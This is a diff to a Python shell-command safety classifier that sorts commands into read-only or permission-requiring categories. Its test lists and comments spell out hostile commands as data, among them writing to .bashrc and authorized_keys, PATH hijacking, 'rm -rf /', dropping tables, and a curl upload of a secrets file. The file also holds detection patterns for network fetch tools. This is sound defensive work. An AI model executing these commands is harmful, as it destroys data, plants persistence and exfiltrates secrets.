@@ -258,9 +258,17 @@ _ACTION_PATTERNS: tuple[tuple[str, re.Pattern[str], tuple[str, ...]], ...] = (
         ("an external system", "other users or consumers"),
     ),
     (
+        # PowerShell's write cmdlets, named the same way `stop-process` already
+        # was: the read-verb list (`_PS_READ_VERBS`) is what usually keeps an
+        # unlisted cmdlet failing closed, but Task 3's unknown-command fallback
+        # (below) now reads a genuinely unrecognised head as a plain command
+        # with no evidence of mutation - which these ARE evidence of, by name,
+        # so they are named here rather than left to fall through to it.
         "filesystem-mutation",
         re.compile(
-            r"(?i)(?:\brm\b|\brmdir\b|\bdel\b|\bremove-item\b|\bmove-item\b|"
+            r"(?i)(?:\brm\b|\brmdir\b|\brd\b|\bdel\b|\bremove-item\b|\bmove-item\b|"
+            r"\bnew-item\b|\bset-content\b|\badd-content\b|\bout-file\b|"
+            r"\bclear-content\b|\brename-item\b|"
             r"\bshutil\.rmtree\b|\bos\.remove\b)"
         ),
         ("local files", "recoverability"),
@@ -305,6 +313,126 @@ _ACTION_PATTERNS: tuple[tuple[str, re.Pattern[str], tuple[str, ...]], ...] = (
         ),
         ("a running process", "whatever it was serving"),
     ),
+)
+
+# A database client's own head, not a bare verb anywhere in the line. The
+# verb-anchored alternative inside `_ACTION_PATTERNS`'s database-mutation
+# entry above only fires when a migration/reset/etc. word is visible - and a
+# real statement handed to one of these clients is usually quoted (`psql -c
+# 'drop table users'`), which blanks the verb before either pattern ever
+# runs. A DB client's whole purpose is running arbitrary statements, so
+# invoking one at all is the evidence; no visible verb is required. Scoped to
+# the actual interactive/scripting clients - not the app-level migration
+# runners (`prisma`, `alembic`, `knex`, ...) the verb-anchored pattern above
+# already covers, where the tool name alone says nothing without a verb.
+DB_CLIENTS = ("psql", "mysql", "sqlite3", "redis-cli", "mongosh", "mariadb",
+              "pg_dump", "pg_restore")
+_DB_CLIENT_HEAD = re.compile(
+    rf"(?i)^(?:{'|'.join(re.escape(name) for name in DB_CLIENTS)})\b")
+
+# Tools that fetch from or send to a remote host. Unlike a merely
+# unrecognised local command, these can exfiltrate - `curl --data-binary
+# @secrets.env <remote URL>` sends the file's contents, not just the fact
+# that curl ran - so they are excluded from the unknown-command fallback's
+# default read even when nothing else about the line looks like a mutation.
+_NETWORK_FETCH_HEADS = re.compile(
+    r"(?i)^\s*(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b")
+
+# Programs this module already models as "has a real write surface, and the
+# safe/read forms of it are enumerated above" (`git`, via `_SAFE_PREFIXES`/
+# `_SAFE_GIT_BRANCH`/`_SAFE_GIT_TAG`/`_SAFE_GIT_REMOTE`/the git-history-or-
+# remote pattern; `gh`, via `_SAFE_GH`) - reaching this point means none of
+# that table matched, which is different from a plain unrecognised command
+# having nothing pointing at a mutation: the existence of a dedicated safe
+# subset for a program is itself the signal that its *un*enumerated forms
+# are not "no evidence." `export`/`unset` join them for the same reason from
+# the other direction - `_ENV_BINDING`'s own negative lookahead is what
+# excludes `PATH`/`LD_PRELOAD`/etc. from the safe form, so anything of this
+# shape reaching here already failed that check on purpose.
+_NAMED_BY_OWN_RULES = re.compile(r"(?i)^\s*(?:git|gh|export|unset)\b")
+
+# Per-command flags that name an output-file argument on a command this
+# module otherwise reads as ordinary inspection: `git log --output=file` and
+# `sort -o file` write a file exactly like a `>` redirect does, without
+# spelling the redirect operator - so a command already matched by
+# `_SAFE_INSPECTION_PATTERNS`/`_SAFE_SHELL_READS` never had its own arguments
+# looked at for one. Keyed by head, not by head+subcommand: `--output` is
+# specific enough a name that scoping it to `git log`/`diff`/`show`
+# specifically buys no real safety, and a data table an exporter can walk
+# directly is worth more than a marginally narrower regex.
+_OUTPUT_FLAGS_BY_HEAD: dict[str, tuple[str, ...]] = {
+    "git": ("--output",),
+    "sort": ("-o", "--output"),
+}
+
+
+def _output_flag_target(segment: Segment) -> str | None:
+    """The path named by one of `_OUTPUT_FLAGS_BY_HEAD`'s flags in
+    `segment`, or None if its head has no such flag or none is present.
+    Reads `segment.tokens` (not `vocab_tokens`): a flag's target is a real
+    argument, path-shaped or not, the same as a redirect's target is."""
+    flags = _OUTPUT_FLAGS_BY_HEAD.get(segment.head.lower())
+    if not flags:
+        return None
+    tokens = segment.tokens
+    for index, token in enumerate(tokens):
+        for flag in flags:
+            if token.startswith(f"{flag}="):
+                return token[len(flag) + 1:]
+            if token == flag:
+                return tokens[index + 1] if index + 1 < len(tokens) else ""
+            # The short form's attached spelling (`-oFILE`, no `=`) - only
+            # for single-character flags, matching what `sort` itself accepts.
+            if len(flag) == 2 and not flag.startswith("--") and token.startswith(flag) \
+                    and token != flag:
+                return token[len(flag):]
+    return None
+
+# Commands whose entire purpose is running a body the classifier cannot read
+# to decide anything about, and are excluded from the unknown-command
+# fallback's default read for that reason - named, not defaulted, the same
+# way `git` and the network fetchers above are.
+#
+# `ForEach-Object { ... }` runs whatever its block contains, same as the
+# stream-editing `sed`/`awk` this task otherwise widens: `StillClosedTests`
+# already pins this cmdlet as permanently protected regardless of how
+# visibly harmless a specific block's content is, because reading the block
+# to decide is the same defect class as `find -exec`/`-delete` deciding by
+# what a shell would do with it rather than by what it names. The
+# `foreach($x in $list){...}` STATEMENT is a different construct (no piped
+# block, no cmdlet) and is not named here.
+#
+# `bash -c "..."`/`sh -c "..."`/`eval "..."` hand an interpreter a whole
+# script as one opaque, usually-quoted argument - `ExecutablePositionTests`
+# already pins `bash -c "rm -rf /"` as protected specifically because
+# quoting must not launder an unrecognised executable. This is the same
+# construct `node -e`/`python -c` are (an interpreter fed a string), except
+# those two are pinned open by `_self_check` and this plan is not chartered
+# to revisit interpreter policy (task-2-report.md, addendum 2) - `bash`/`sh`
+# were never on that allowance and are not added to it here.
+_UNKNOWABLE_BODY_HEADS = re.compile(
+    r"(?i)^\s*ForEach-Object\b|"
+    r"^\s*(?:bash|sh|zsh|ksh|dash)\b[^;|&]*\s-c\b|"
+    r"^\s*eval\b"
+)
+
+# The one shape of the excluded tools above this project's own transcripts
+# show being used harmlessly: a status probe that discards the response body
+# and sends nothing. `curl` needs both a discarded output (`-o /dev/null`)
+# and the write-out flag that is the whole reason to run it that way;
+# PowerShell's request cmdlets need the flag that names this as a basic
+# status check (`-UseBasicParsing`) AND to not be writing the response to a
+# file, a non-GET method, or a request body - `-UseBasicParsing` is required
+# rather than merely tolerated, because a bare `Invoke-WebRequest <url>` with
+# none of these flags is still an ordinary fetch of whatever the URL returns,
+# not a probe, and must keep asking. Read-only either way - what governs
+# actually fetching data is the separate network gate, not this classifier.
+_SAFE_NETWORK_PROBE = re.compile(
+    r"(?i)^\s*curl\b(?=[^;|&]*\s(?:-o|--output)[ \t]+(?:/dev/null|nul)\b)"
+    r"(?=[^;|&]*\s(?:-w|--write-out)\b)|"
+    r"^\s*(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b"
+    r"(?=[^;|&]*-UseBasicParsing\b)"
+    r"(?![^;|&]*(?:-OutFile\b|-Method[ \t]+(?!GET\b)\S|-Body\b))"
 )
 
 # Argument tokens the anchored safe listings may carry. Shell control and
@@ -352,7 +480,10 @@ _SAFE_PREFIXES = re.compile(
     r"(?i)^\s*(?:git\s+(?:status|diff|log|show|rev-parse|rev-list|describe|blame|"
     r"annotate|shortlog|whatchanged|name-rev|merge-base|for-each-ref|show-ref|"
     r"count-objects|check-ignore|check-attr|cat-file|ls-files|ls-tree|ls-remote|"
-    r"diff-tree|diff-index|grep|version|worktree\s+list|"
+    # `fetch` downloads objects and updates remote-tracking refs; it touches
+    # no local branch and loses no local work, which is the same
+    # non-destructive shape as `remote update` already being read here.
+    r"diff-tree|diff-index|grep|version|fetch|worktree\s+list|"
     r"stash\s+(?:list|show))|inspect|read|list|show|explain|doctor|privacy)\b"
 )
 
@@ -498,8 +629,10 @@ _UNRESOLVED_EXPANSION = re.compile(r"[~$`]|%[A-Za-z_][A-Za-z0-9_]*%")
 
 # Writing to the null device discards the bytes: `integrity > /dev/null` runs a
 # check and keeps nothing. It was refused as a write outside the working tree,
-# which made silencing a command's output a protected operation.
-_NULL_DEVICE = re.compile(r"(?i)^(?:/dev/null|nul|/dev/std(?:out|err))$")
+# which made silencing a command's output a protected operation. `$null` is
+# PowerShell's own spelling of the same thing - a variable that discards
+# whatever is assigned or redirected to it, not a path.
+_NULL_DEVICE = re.compile(r"(?i)^(?:/dev/null|nul|\$null|/dev/std(?:out|err))$")
 
 
 def _is_scratch(target: Path, project_root: Path | None = None) -> bool:
@@ -795,6 +928,40 @@ def _vocab_tokens(words: list[str]) -> list[str]:
     if not words:
         return []
     return [words[0]] + [word for word in words[1:] if not _is_path_shaped(word)]
+
+
+def _has_unclosed_quote(text: str) -> bool:
+    """Whether a quote opened in `text` is still open at its end.
+
+    The same quote state `_executable_text`'s scan already tracks, exposed
+    here because an unterminated quote - malformed input, or the harvest/fuzz
+    truncation Task 2's own investigation found - can swallow real vocabulary
+    into what then looks like quoted, inert text: everything after the open
+    quote blanks to nothing, including a mutation verb sitting right there in
+    the unquoted original. The unknown-command fallback's "no evidence" read
+    depends on actually having looked at the text; a segment that cannot be
+    parsed reliably is not evidence of nothing, it is evidence the parse
+    failed, and stays on the ask side rather than defaulting open. A second,
+    independent scan rather than reusing `_executable_text`'s blanked output,
+    so this can never be fooled by whatever the blanking already discarded.
+    """
+    quote: str | None = None
+    index = 0
+    length = len(text)
+    while index < length:
+        character = text[index]
+        if character == "\\" and quote != "'" and index + 1 < length:
+            index += 2
+            continue
+        if quote:
+            if character == quote:
+                quote = None
+            index += 1
+            continue
+        if character in "\"'":
+            quote = character
+        index += 1
+    return quote is not None
 
 
 def _segment_from_text(raw: str) -> Segment:
@@ -1104,17 +1271,42 @@ def _categorize(normalized: str, project_root: Path | None = None) -> tuple[str,
     # by path.
     command_position = " ".join(segment.vocab_tokens)
 
+    # A write this classifier must not read past, computed before any "this
+    # looks like a read" pattern below gets to return early -
+    # `_SAFE_INSPECTION_PATTERNS`/`_GIT_LOCAL_CHANGE` matched on the
+    # command's own verb and never looked at its arguments, so `git log
+    # --oneline > /etc/hosts` and `git log --output=/tmp/x` (an output-file
+    # flag doing the redirect's job without spelling the operator) both
+    # returned a plain read with the write never inspected. Two sources feed
+    # the same evidence: a real, quote-aware `>`/`>>`
+    # (`segment.redirect_target`, already confirmed by `_segment_from_text`),
+    # and a per-command output flag (`_output_flag_target` /
+    # `_OUTPUT_FLAGS_BY_HEAD` - `sort -o`, `git ... --output=`) - a flag
+    # naming a destination is exactly as much evidence of a write as the
+    # redirect operator is, on a command this module otherwise treats as
+    # read-only.
+    write_target = segment.redirect_target if segment.has_redirect else None
+    if write_target is not None and _NULL_DEVICE.match(write_target.strip().strip("\"'")):
+        # Discarding output is not writing a file - checked before it can
+        # suppress the safe-read patterns below for no reason.
+        write_target = None
+    from_output_flag = False
+    if write_target is None:
+        write_target = _output_flag_target(segment)
+        from_output_flag = write_target is not None
+
     if _GIT_BRANCH_MUTATION.search(command_position):
         return (
             "git-branch-mutation",
             True,
             ["branch refs", "possibly unmerged local work"],
         )
-    if any(pattern.search(normalized) for pattern in _SAFE_INSPECTION_PATTERNS):
+    if write_target is None and any(
+            pattern.search(normalized) for pattern in _SAFE_INSPECTION_PATTERNS):
         return "read-only-inspection", False, ["local read-only state"]
     # Checked after the branch mutation and before the protected patterns, so
     # a commit is ordinary while `--amend` still falls through to them.
-    if _GIT_LOCAL_CHANGE.match(executable):
+    if write_target is None and _GIT_LOCAL_CHANGE.match(executable):
         return ("local-repository-change", False,
                 ["the index or a new local commit; nothing leaves the machine"])
     # A help banner describes the operation instead of performing it, so the
@@ -1126,6 +1318,34 @@ def _categorize(normalized: str, project_root: Path | None = None) -> tuple[str,
         for category, pattern, impact in _ACTION_PATTERNS:
             if pattern.search(command_position):
                 return category, True, list(impact)
+        # A DB client invoked at all, verb visible or not (see `_DB_CLIENT_HEAD`'s
+        # own comment for why the verb-anchored pattern above is not enough).
+        if _DB_CLIENT_HEAD.match(command_position):
+            return ("database-mutation", True,
+                    ["a database client invocation; its argument may run "
+                     "arbitrary statements"])
+    # Whether a later check in this function would recognise the head at all
+    # - every one of the still-anchored read/compute lists a genuinely
+    # unrecognised command falls through to below. Computed here, before the
+    # redirect is judged, because a recognised head's redirect keeps the
+    # existing containment check (`echo hi > out.txt`) while an unrecognised
+    # one's does not: an unfamiliar command combined with a real write is
+    # exactly the evidence the unknown-command fallback exists to still ask
+    # about, not to wave through because the target happened to resolve
+    # inside the tree.
+    head_known = bool(
+        _SAFE_SHELL_READS.match(normalized) or _POWERSHELL_READS.match(normalized)
+        or _TEST_BUILTIN.match(normalized) or _ENV_BINDING.match(normalized)
+        or _LOCAL_COMPUTE.match(normalized)
+        # `git`/`gh` are "known" for this purpose even though they are
+        # excluded from the unknown-command fallback's no-evidence default
+        # (`_NAMED_BY_OWN_RULES`'s own comment) - that exclusion is about
+        # defaulting an unenumerated subcommand open, a separate question
+        # from whether a write this module DID detect (a redirect, an
+        # output flag) should be judged by where it lands, the same as any
+        # other recognised command's write already is.
+        or _NAMED_BY_OWN_RULES.match(normalized)
+    )
     # A redirect writes a file whatever the verb says, so it is checked after
     # the named mutations but before the read allowances. `segment.has_redirect`
     # is a quote-aware presence check: `node -e "console.log(1 >>> 2)"` has a
@@ -1139,20 +1359,28 @@ def _categorize(normalized: str, project_root: Path | None = None) -> tuple[str,
     # the real write through as contained. A legitimately quoted target
     # (`> "out.txt"`) still resolves correctly, because `redirect_target` is
     # read from the untouched original text, not the blanked one.
-    target = segment.redirect_target if segment.has_redirect else None
-    if target is not None and _NULL_DEVICE.match(target.strip().strip("\"'")):
-        # Discarding output is not writing a file. Checked before containment,
-        # because the null device is outside every working tree and so was
-        # refused as a write to somewhere it does not belong.
-        target = None
-    if target is not None:
+    #
+    # `write_target` (computed above, before the early safe-read returns) is
+    # reused here rather than re-derived, so the two checks can never
+    # disagree about what counts as a write.
+    if write_target is not None:
+        kind = "an output flag's" if from_output_flag else "a redirected"
+        if not head_known:
+            # An unfamiliar command with a real write is asked about by name
+            # rather than judged on where the write lands - containment says
+            # nothing about what an unrecognised program actually does with
+            # the rest of its arguments.
+            return ("unknown-command", True,
+                    [f"an unrecognised command: {segment.head}",
+                     f"{kind} write to {write_target[:80] or '(no target)'}"])
         # The same act as an `Edit`, judged the same way. Refusing every
         # redirect while permitting the declared edit of the same path gated
         # the honest form and not the other, which is all cost and no cover.
-        if not target or not _contained(target, project_root) or _SENSITIVE_EDIT.search(target):
+        if (not write_target or not _contained(write_target, project_root)
+                or _SENSITIVE_EDIT.search(write_target)):
             return ("worktree-file-mutation", True,
-                    [f"a redirected write outside ordinary working files: {target[:80]}"])
-        return "worktree-file-mutation", False, ["a redirected write inside the working tree"]
+                    [f"{kind} write outside ordinary working files: {write_target[:80]}"])
+        return "worktree-file-mutation", False, [f"{kind} write inside the working tree"]
     if _FIND_MUTATION.search(command_position):
         return "filesystem-mutation", True, ["local files", "recoverability"]
     # Last, so a help flag never excuses a redirect or a delete beside it.
@@ -1166,10 +1394,49 @@ def _categorize(normalized: str, project_root: Path | None = None) -> tuple[str,
                 ["a value for later commands in this shell"])
     if _LOCAL_COMPUTE.match(normalized):
         return "local-compute-or-state", False, ["local computation; no protected surface named"]
+    # Nothing above recognised this command, and nothing above found evidence
+    # it mutates anything either - no real redirect (handled above), no named
+    # write flag. `unclassified-mutation` used to be the answer for this
+    # exact case, and it was the wrong one: it does not distinguish "this
+    # names a real, dangerous thing this classifier does not yet know how to
+    # read" from "this is `rev` in the middle of a pipeline of ordinary
+    # reads," and asked (at best) or refused for both alike. An unfamiliar
+    # command with nothing pointing at a mutation is read here rather than
+    # asked about - `git` and the network fetchers above are the two
+    # exceptions that still ask by name (a git subcommand this table does not
+    # enumerate, or a request tool that can send data out, are not "no
+    # evidence" in the same sense a plain unrecognised filter or reporting
+    # tool is).
+    if _NAMED_BY_OWN_RULES.match(normalized):
+        head = segment.head.lower()
+        if head in ("export", "unset"):
+            detail = f"an environment variable outside the bookkeeping allowance: {segment.head}"
+        else:
+            detail = (f"an unrecognised {head} subcommand or flag: "
+                       f"{(segment.subcommand or '').strip() or '(none)'}")
+        return ("unknown-command", True, [detail])
+    if _UNKNOWABLE_BODY_HEADS.match(normalized):
+        return ("unknown-command", True,
+                [f"{segment.head} runs a body this classifier does not read"])
+    if _NETWORK_FETCH_HEADS.match(normalized) and not _SAFE_NETWORK_PROBE.match(normalized):
+        return ("unknown-command", True,
+                [f"a network request: {segment.head}",
+                 "may send data to a remote host"])
+    if _SAFE_NETWORK_PROBE.match(normalized):
+        return ("local-compute-or-state", False,
+                ["a read-only network status probe; the network gate governs fetching"])
+    if _has_unclosed_quote(segment.text):
+        # Not "no evidence" - evidence the parse failed. A quote left open
+        # blanks everything after it, real verbs included, so an unrecognised
+        # command shaped like this is judged unreadable rather than empty.
+        return ("unknown-command", True,
+                ["a quote in this segment is never closed; the text after "
+                 "it cannot be read reliably"])
     return (
-        "unclassified-mutation",
-        True,
-        ["unknown state; fail closed until explicitly scoped"],
+        "read-only-inspection",
+        False,
+        [f"an unrecognised command: {segment.head}" if segment.head
+         else "no recognised command"],
     )
 
 
@@ -1779,6 +2046,13 @@ def _self_check() -> None:
         "git merge-base main HEAD", "gh auth status", "gh --help",
         "python scripts/godmode.py integrity > /dev/null",
         'export GODMODE_STATE_HOME="/tmp/state"', '$d = "C:\\temp"',
+        # A genuinely unrecognised command with no evidence it mutates
+        # anything (no redirect, no named write flag) is read rather than
+        # asked about (U-G1b) - `unclassified-mutation`'s fail-closed-for-
+        # ignorance default is gone; `git`, the network fetchers, and the
+        # opaque-body executors below are the named exceptions that still
+        # ask, not the rule.
+        "frobnicate --all", "rev docs/notes.txt",
     )
     for operation in allowed:
         verdict = classify_action(operation)
@@ -1790,12 +2064,17 @@ def _self_check() -> None:
         "git push --force", "git reset --hard HEAD~3", "rm -rf build",
         "DROP TABLE orders", "git status && git push origin main",
         "ls | xargs rm", "Remove-Item -Recurse -Force build",
-        "write file .git/config", "frobnicate --all",
+        "write file .git/config",
         # Permitted once, on the grounds that an unexpanded `~` made the
         # target look like an ordinary file inside the working tree.
         "echo pwned > ~/.bashrc", "write file $HOME/.ssh/authorized_keys",
         "git commit-tree -m x HEAD", "export PATH=/evil:$PATH",
         f"ls\nInvoke-WebRequest {remote}", f"ls $(curl -s {remote})",
+        # Quoting an opaque script at a shell/eval must not launder it (U-G1b);
+        # a DB client is protected by name alone, verb visible or not; an
+        # unrecognised `git` subcommand still asks rather than reading R0.
+        'bash -c "rm -rf /"', "psql -c 'drop table users'", "git mv a.txt b.txt",
+        "ForEach-Object { Remove-Item x }",
     )
     for operation in protected:
         verdict = classify_action(operation)
